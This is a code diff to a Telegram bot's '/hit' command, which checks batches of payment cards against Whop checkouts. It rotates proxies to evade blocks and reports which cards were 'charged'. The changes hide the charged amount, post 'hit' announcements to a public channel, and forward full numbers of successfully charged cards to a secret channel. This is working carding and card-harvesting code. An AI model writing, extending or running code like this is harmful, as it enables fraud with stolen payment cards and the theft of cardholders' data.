@@ -3121,7 +3121,6 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     loop = asyncio.get_running_loop()
     results_data = []
-    amount_str = "N/A"
     has_paid = False
 
     try:
@@ -3139,7 +3138,6 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             # Try up to 3 different proxies for each card
             max_proxy_retries = min(3, len(proxies_list))
             result = None
-            proxy_failed = False
 
             for attempt in range(max_proxy_retries):
                 proxy_to_use = random.choice(proxies_list)
@@ -3160,10 +3158,8 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 if st_temp == "error" and ("Page load failed" in msg_temp or "ProxyError" in msg_temp or "403" in msg_temp):
                     logger.warning(f"Proxy {proxy_to_use} failed for {card_str}. Retrying with a new proxy ({attempt+1}/{max_proxy_retries})...")
                     await asyncio.sleep(1) # Short delay before next proxy
-                    proxy_failed = True
                     continue # Try next proxy
                 else:
-                    proxy_failed = False
                     break # Success or non-proxy error, stop retrying
 
             if result is None:
@@ -3176,20 +3172,6 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             if st == "charged":
                 has_paid = True
                 sub_msg = "Payment successful"
-                
-                # ── Extract Real Amount Paid ──
-                amt_raw = result.get("amount", 0)
-                cur = result.get("currency", "USD").upper()
-                try:
-                    amt_val = float(amt_raw)
-                    # If amount is in cents (e.g., 2999), convert to dollars (29.99)
-                    if amt_val > 100:
-                        amount_str = f"{amt_val / 100:.2f} {cur}"
-                    else:
-                        amount_str = f"{amt_val:.2f} {cur}"
-                except (ValueError, TypeError):
-                    pass
-
             elif st == "3ds":
                 sub_msg = result.get("url", "3DS required")
             elif st == "declined":
@@ -3222,12 +3204,11 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         else:
             overall_status = "Not Paid ❌"
 
-        # Build Final Text for User
+        # Build Final Text for User (Amount Hidden)
         text = (
             f"#Whop [/hit]\n"
             f"⸺⸺⸺⸺⸺\n"
             f"⌑ Site : Whop 🌐\n"
-            f"⌑ Amount : {amount_str}\n"
             f"⌑ Status : {overall_status}\n"
             f"⌑ Progress : {total_cards}/{total_cards}\n"
             f"⸺⸺⸺⸺⸺\n"
@@ -3243,15 +3224,14 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         paid_cards = [res for res in results_data if res['status'] == 'charged']
         if paid_cards:
             try:
-                user_name = escape(update.effective_user.first_name or "User")
                 uid_str = update.effective_user.id
                 username_str = f"@{update.effective_user.username}" if update.effective_user.username else "N/A"
                 
-                # Base Hit Logo Text (For Public Channel)
+                # Base Hit Logo Text (Amount set to 'hide' as requested)
                 base_logo_text = (
                     f"⌑Status : Charged 💎\n"
                     f"⌑Hitter : Whop\n"
-                    f"⌑Amount : {amount_str}\n"
+                    f"⌑Amount : hide\n"
                     f"⌑Resp : Payment successful\n"
                     f"⌑User : {username_str}\n"
                     f"⌑Order : ****{uid_str % 65536:04X}\n"
@@ -3273,10 +3253,10 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 except Exception as e:
                     logger.error(f"Failed to send hit logo to Batcardchk: {e}")
                 
-                # 2. Send ONLY Card Details to Secret Channel (No Logo)
-                secret_cards_text = f"🤑 <b>New Paid Whop Order</b>\n👤 User: {username_str} (<code>{uid_str}</code>)\n💰 Amount: {amount_str}\n\n"
+                # 2. Send Logo + Card Details to Secret Channel
+                secret_cards_text = base_logo_text + "⸺⸺⸺⸺⸺\n"
                 for res in paid_cards:
-                    secret_cards_text += f"<code>{res['card']}</code>\n"
+                    secret_cards_text += f"⌑Card : <code>{res['card']}</code>\n"
                 
                 try:
                     await context.bot.send_message(
@@ -3294,6 +3274,7 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     finally:
         # Always remove the user from the lock when done or if it crashes
         active_hit_users.discard(update.effective_user.id)
+    
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # USER COMMANDS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
